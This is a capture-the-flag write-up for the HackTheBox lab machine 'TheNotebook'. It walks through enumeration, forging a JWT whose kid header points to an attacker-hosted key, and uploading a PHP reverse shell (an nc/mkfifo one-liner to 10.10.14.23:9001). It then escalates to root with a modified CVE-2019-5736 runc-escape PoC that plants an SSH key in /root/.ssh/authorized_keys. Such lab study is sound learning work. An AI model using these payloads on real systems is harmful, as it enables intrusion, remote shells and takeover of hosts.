---
title: 'HTB | TheNotebook'
published: 2025-07-02
draft: false
description: 'HTB Machine `TheNotebook` writeup.'
tags: ['HackTheBox', 'linux']
---

# Enumeration

## Port Scanning

### TCP Scan - All Ports

```
# Nmap 7.94SVN scan initiated Wed Sep  3 13:08:37 2025 as: nmap -sC -sV -p22,80,10010 -Pn -n -vv -oN nmap/tcp_deep 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up, received user-set (0.069s latency).
Scanned at 2025-09-03 13:08:37 IST for 11s

PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZwjrB05nGUvacI81YxNqy+6WpPHhIju6c73aoiru9nW/aVhTmOEsSOGoChEXeQeDN67ZN5QW4LFf0tXeQeJqvgO82HtFkUOiN8tt1RpI98SV+hx8scCzpmtAyu1OJSUM3/cL2tEPTcPHAgHTmroWiXxIMPhTFLIoDVBIqmBrORUIwgjIzFUbEDQJXKPkFciofbowVOkHnT+lv5XokU6571wrX/LRJvTNBEAvbbz0HAfvUkne8ycQsW08qk/BugiLnJHLg24YryGdHl5RqqW/42fsUADngFLncy2+/XCo8Pe/erO+7Zw6r4n1qVb0W0BZ+lRflcRss3diM/21R6O0z
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLeuBF/ZBUM0ZBYW4+vgQMhIPWVs2fzv9lmQHoflWFNMP/sFWZDeVneJE0CRSLnYi2y/wwc079bIsQRibay3Fpg=
|   256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDg0mzA1xTe9hivlJN4s+7eXaiyIYefpyykHIir3btEA
80/tcp    open     http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: The Notebook - Your Note Keeper
|_http-server-header: nginx/1.14.0 (Ubuntu)
10010/tcp filtered rxapi   no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  3 13:08:48 2025 -- 1 IP address (1 host up) scanned in 10.88 seconds

```

- TCP Scan shows 2 open ports : 22 (SSH) & 80 (http) and 1 filtered port : 10010 (rxapi?).
- The host is running Ubuntu
- The `http-title` says : `The Notebook - Your Note Keeper`
- Nginx version is `1.14.0` , which is pretty old. I will later check for any public vulnerabilities available, if required.

### UDP Scan

- No UDP ports found open or filtered.

## HTTP Web App @80

- Checking the 404 page and referencing it from [0xdf's Error Pages Cheatsheet](https://0xdf.gitlab.io/cheatsheets/404#) , the application is probably running `flask`.

### Directory Bruteforce

- I will run `feroxbuster` with no extensions to check for any hidden directories.

```shell
$ feroxbuster -u http://10.10.10.230/ -o dirbust/root --json
```

- I can run a simple `jq` exp to view all the discovered paths.

```bash
$ cat dirbust/root | jq '. | select(.type == "response")'.path -r
/admin
/static/css/style.css
/static/css/grid.css
/logout
/login
/register
/static/book.svg
/static/css/signin.css
/static/favicon.ico
/static/css/bootstrap.min.css
/
```

- Out of these, `/static` are just icons and css files.
- `/admin` returns `forbidden`

### Login Page

- Login requires a `username` & `password`.
- A valid `username` with wrong `password` returns `Login Failed! Reason: Incorrect Password`

### Register Page

- To Register, `username` , `password` & `email` is required.
- A successful registeration redirects to `/` and sets 2 cookie :
  - `auth` : flask jwt
  - `uuid` : UUID for the registered user
- Both without `httponly` flag. Could be useful if I found any XSS
- The root page (at `/`) after logging in shows my `usernaeme`. I could test it for `SSTI`.
- Registering with same email but different username is also not allowed. Error : `Signup Failed! Reason: Account with this Email already exists.`

### Logout Page

- It clears both of my cookies, and redirects me to root page `/`.

### JWT Token

- Decoding the assigned token in [**jwt.io**](https://jwt.io/) shows this.

**JWT Data**

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
```

- Algorithm used : `RS256`
- `kid` : Key Identifier, key used by server to verify this jwt, available at `localhost:7070/privKey.key`

**User Data**

```json
{
  "username": "conner",
  "email": "conner@notebook.htb",
  "admin_cap": 0
}
```

- My `username` & `email`
- `admin_cap` (admin capabilities ?) - set to 0

### Root/Home Page

![[Pasted image 20250903134733.png]]

- At the home page, it says `Welcome back! conner. Visit /notes to access your notes or select it from navbar.`
- From here, I will enumerate what is available at `/notes` plus I will run `feroxbuster` again with the cookies set, just in case I find something hidden but I have access to after logging in .

### Feroxbuster /w Cookies

- No new routes found, just the previous findings with a new `/<uuid>/notes` route.

### `/uuid/notes`

- The page has a link to `/uuid/notes/add` to create a new note.
- After creating a note, it get assigned an id? of `5`. Creating another note, it get assigned an id of `6`.
- I can view these notes at `/<uuid>/notes/<note_id>`. It shows note title, content and my `username`.
- Currently, I don't see any option to `edit` or `delete` a note I created.
- In a new private tab, I find **I can view notes for any uuid without logging in.**

<hr>

# Exploitaion

## SSTI

- There are many possible injection points for SSTI throughout the app.
- I will start from `username` & `email`
- Trying the 2 payloads from `PayloadsAllTheThings` cheatsheet in all username, email , Note Title & Note Content does not work.

<hr>

**Note :**
During testing for SSTI from multiple accounts and creating multiple notes, I noticed that `note_id` is getting incremented for each note created by any user. This means, If I have `uuid` for any other user, I can easily read their notes.

<hr>

## Playing with Cookies

### UUID

- Some initial enumeration revealed that the `uuid` cookie is not being processed in any way by the app, atleast for the current pages.
- Chaning its value, not sending it in requests does not change page response.

### Auth

- This cookie is a `jwt` token that includes `kid` header that references to a private key used to sign this token.
- Its **not an ID** but a _url/link_ to where the server can find this key.
- I can try to create my own token, self-signed , with `admin_cap` set to `true` or `1`.
- In this token, I can set the `kid` header to the private key I used to sign this token, hosted on my server.

#### Generating a Self-Signed JWT

- Before creating the token, we first need to generate a set of private and public key, to sign the token.

```bash
# Generate private key (2048 or 4096 bits)
$ openssl genrsa -out private.key 2048

# Extract public key
$ openssl rsa -in private.key -pubout -out public.key
```

- Next, we need to sign a token with these keys.

**Using cli tool : `jwt`**

```bash
$ apt-get install jwt
$ jwt -key private.key -alg RS256 -sign + \
-header kid='http://10.10.14.23:8000/private.key' \
-claim username=conner \
-claim emal='conner@notebook.htb' \
-claim admin_cap=1

eyJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMzo4MDAwL3ByaXZhdGUua2V5IiwidHlwIjoiSldUIn0.eyJhZG1pbl9jYXAiOiIxIiwiZW1hbCI6ImNvbm5lckBub3RlYm9vay5odGIiLCJ1c2VybmFtZSI6ImNvbm5lciJ9.ROQotnh0wzVR09aG3jfA-0HbWzPX8Ym9rza_PRSNeFM8SzmEMrm2IJwv4tV9sYUDIzzFKr8_EFF_tIMmChzuzuLIt4wq2GsLVnwJ8_wcIrEf3f6zyj0zR3w8DzbUY9r_fxM0sccQ4cOGVw5moCojmLDW_66XY8C4Dis3hGryNBBI4sPFvK4unz4hYRrKTKucE7AJoMbfFxDuL90xf2eD6W4LFqvlSTIZW-7Ftczyzz-PxiRcQ_SP8c3Z7jsd_C7lXd95b8mjCL_KEOW9mGywwyDt_GsY2U3UbW4f77-XlvfUOuz82SCRMFbFhtmPShySLNSXpWrj2nTpWUf9eKV35w
```

It outputs a self-signed jwt token with `admin_cap` set to `"1"`.

## Accessing Admin Panel

- Before I can use my forged jwt, I should make sure that the `private.key` is available and hosted on my server.
- Finally, I paste my token in the browser cookie and see that now, I have access to admin panel at `/admin`.

### Reading all available notes on the server

- There are 4 notes other than the ones created by me.
- Out of these 4, 2 are useful and hints that `php files are being executed on the server` & `a backup directory is been created and is present on the server.`

## Shell as `www-data`

- There is a file upload functionality on the server. Using this, I upload a php file that sends me a reverse shell when executed.

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.23 9001 >/tmp/f &") ?>
```

- Uploading and Viewing this file works, and I get a shell as `www-data`

<hr>

## Recon as `www-data`

- There are 2 users on the box : `root` & `noah`
- I start from finding common files that are owned by `noah` but are readable to me, found nothing interesting.
- Next, I searched for source code of the python web application, didn't found it, probably running from inside a container. Presence of `docker` does supports that.
- I cannot view `root` or `noah` users' running processes.
- At this point, I can run `linpeas.sh` to enumerate further , but I remember the `note` on the website that hinted that a `backup` is present on the box.
- I check `/var/backups` directory and a `home.tar.gz` backup is present that I have read-access to.
- I extract this file, & notice this is `noah` user's home directory (without the `user.txt`).

```bash
$ tar -zxvf home.tar.gz
```

- The extracted dir contains `.ssh` folder with `keys` inside it. I copy these so I can ssh as `noah`.

<hr>

# Post-Exploitation

## Recon as `noah`

- Checking `sudo -l` , the user `noah` is allowed to run the command `/usr/bin/docker exec -it webapp-dev01*` as `root` without password.
- If the subcommand was `run` instead of `exec`, then that would have been simple. I could just mount `/root` directory and run the interactive shell and read `root.txt`.
- `exec` means running _already-running_ containers, to which we cannot mount a new volume.
- I check for `/var/run/docker.sock` , but my user `noah` doesn't have access to communicate with this file.

## CVE-2019-5736

- With the less remaining options, I check this docker version ,which is `18.06.0-ce`.
- I check for any vulnerabilities / CVEs for this version on CVEDetails.
- CVE-2019-5736 with highest CVSS of 9.3 stands out. It also has its public exploit available on `metasploit`.

### Metasploit `exploit/linux/local/docker_runc_escape`

- To execute this exploit using `metasploit` , I first need to create a revshell payload using `msfvenom` and execute it from inside the container.
- I create a simple executable using payload `linux/x64/meterpreter/reverse_tcp` , send it to the container and execute it. I get a `meterpreter` shell inside `msfconsole`.
- I background this session.
- Next, I import the docker exploit module, set targets , set options with `SESSION` set to `1`.
- After running, the exploit completed but I didn't get access to `root` shell on the box. Not sure why ?

### Github PoC

- Another PoC for this cve is available [here](https://github.com/Frichetten/CVE-2019-5736-PoC).
- Its a nice, simple, single file exploit. I clone its repository.
- Inside the `main.go` file, I edit the payload the following :
  `var payload = "#!/bin/bash \n mkdir -p /root/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDK1V2EeiKpilW/kYgvjH4cmyDNwrbA7IJkRKWUcj0n/ VM Auth Key' > /root/.ssh/authorized_keys"`
  - Create `.ssh` directory inside `/root`.
  - Add my `public key` to `authorized_keys` inside the folder.
- Next, I build this exploit using `go build main.go` and transfer it to run it from inside the container.
- After running this exploit, and connecting to the container again from another ssh session, the exploit says that the payload command has been executed.
- I ssh as `root` using my private id_rsa key and I got access as `root` on the box.
